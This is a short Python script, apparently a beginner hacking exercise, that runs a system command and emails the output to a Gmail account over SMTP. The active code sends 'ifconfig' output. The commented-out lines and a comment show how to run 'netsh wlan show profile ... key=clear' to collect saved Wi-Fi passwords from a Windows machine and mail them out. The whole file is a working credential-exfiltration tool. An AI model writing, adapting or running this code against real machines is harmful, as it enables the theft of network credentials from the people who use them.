#!/usr/bin/env python  

import subprocess, smtplib, optparse, re


def get_arguments():

    parser = optparse.OptionParser()

    parser.add_option("-e", "--email", dest="email", help="Email address")
    parser.add_option("-p","--password",dest="pw",help="Password of email address")

    options,arguments = parser.parse_args()

    if not options.pw and not options.email:
        parser.error("[-] Please provide an email address and a password. Use -h for more information") 
    elif not options.email:
        parser.error("[-] Please provide an email address")
    elif not options.pw:
        parser.error("[-] Please provide a password")

    return options

#Creates an SMTP server and connects to the google 
#server to send an email with the login credentials provided
def send_mail(email, password, message):
    smtp_server = smtplib.SMTP("smtp.gmail.com",587)
    smtp_server.starttls()
    smtp_server.login(email,password)
    smtp_server.sendmail(email, email, message)
    smtp_server.quit()


options = get_arguments()
command = "ifconfig"
#This line are for netsh wlan show profile
#command in windows and get the interface keys
networks = subprocess.check_output(command, shell=True)
#network_names_list = re.findall("(?:Profile\s*:\s)(.*)",networks)

#result=""
#for name in network_names_list:
#    command = "netsh wlan show profile" + name + "key=clear"
#    current_result = subprocess.check_output(command, shell=True)
#    result = result + current_result

send_mail(options.email,options.pw,networks)